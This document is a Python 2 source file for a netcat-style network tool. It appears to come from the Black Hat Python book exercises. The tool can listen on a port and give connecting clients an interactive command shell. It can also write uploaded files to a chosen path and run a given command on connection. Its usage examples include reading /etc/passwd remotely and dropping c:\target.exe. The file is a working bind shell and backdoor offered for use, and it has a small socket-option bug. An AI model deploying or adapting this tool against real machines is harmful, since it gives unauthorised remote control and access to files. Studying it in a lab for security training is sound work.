import getopt
import os
import socket
import subprocess
import sys
import threading

# Define globals
listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0
home = None


def usage():
    print 'BHP Net Tool'
    print
    print 'Usage: netcat.py -t target_host -p port'
    print '-l --listen                  - listen on [host]:[port] for incoming connections'
    print '-e --execute=file_to_run     - execute the given file upon receiving a connection'
    print '-c --command                 - initialize a command shell'
    print '-u --upload=destination      - upon receiving and connection upload a file and write to [destination]'
    print
    print
    print 'Examples: '
    print "netcat.py -t 192.168.0.1 -p 5555 -l -c"
    print "netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "netcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./nnetcat.py -t 192.168.11.12 -p 135"
    sys.exit(0)


def client_sender():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to target
        client.connect((target, port))

        while True:

            # Wait for response
            recv_len = 1
            response = ''

            while recv_len:

                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print response,

            # Wait for more inpurt
            try:
                usr_buffer = raw_input('')
            except EOFError:
                client.close()
                sys.exit(0)
            usr_buffer += '\n'

            # Send buffer
            client.send(usr_buffer)

    except socket.error as err:
        print '[*] Exception: %s' % err

        # Close connection
        client.close()


def server_loop():
    global target
    global home

    # If not target is defined, listen on all interfaces
    if not len(target):
        target = '0.0.0.0'

    server = ''
    home = os.getcwd()

    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    print '[*] Listening on %s:%d' % (target, port)

    while True:
        client_socket, address = server.accept()

        print '[*] Accepted connection from: %s:%d' % (address[0], address[1])

        # Create thread to handle new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket, address,))
        client_thread.start()


def run_command(cmd):

    # Trim whitespace
    cmd = cmd.rstrip()

    # Run the command and return output
    try:
        if cmd.split(' ')[0] == 'cd':
            os.chdir(cmd.split(' ')[1])
            return run_command('pwd')

        else:
            output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as err:
        output = '%s' % err.output

    # Send output back to client
    return output


def client_handler(client_socket, address):
    global upload
    global execute
    global command
    global home

    # Check for upload
    if len(upload_destination):

        # Read in bytes and write to destination
        file_buffer = ''

        # Kepp reading until all data processed
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # Write bytes received
        try:
            file_descriptor = open(upload_destination, 'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # Confirm bytes were written
            client_socket.send('Successfully save filed to %s\r\n' % upload_destination)
        except:
            client_socket.send('Failed to save file to %s\r\n' % upload_destination)

    # Check for command execution
    if len(execute):

        # Run the command
        output = run_command(execute)

        client_socket.send(output)

    # Go into loop if shell was requested
    if command:

        # Show a prompt
        client_socket.send('Netcat$ ')

        while True:

            # Recieve data until enter key is pressed
            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                try:
                    cmd_buffer += client_socket.recv(1024)
                except socket.error:
                    print '[*] Closed connection from: %s:%d' % (address[0], address[1])
                    os.chdir(home)
                    return

                if cmd_buffer == '':
                    print '[*] Closed connection from: %s:%d' % (address[0], address[1])
                    os.chdir(home)
                    return

            # Send back output
            response = run_command(cmd_buffer)

            response += 'Netcat$ '

            # Send back response
            client_socket.send(response)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    opts = None

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hle:t:p:cu:', ['help', 'listen', 'execute', 'target', 'port',
                                                                 'command', 'upload'])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # Listen to send data from stdin?
    if not listen and len(target) and port > 0:

        # Send data
        client_sender()

    # Listen for commands instead
    if listen:
        server_loop()


if __name__ == '__main__':
    main()
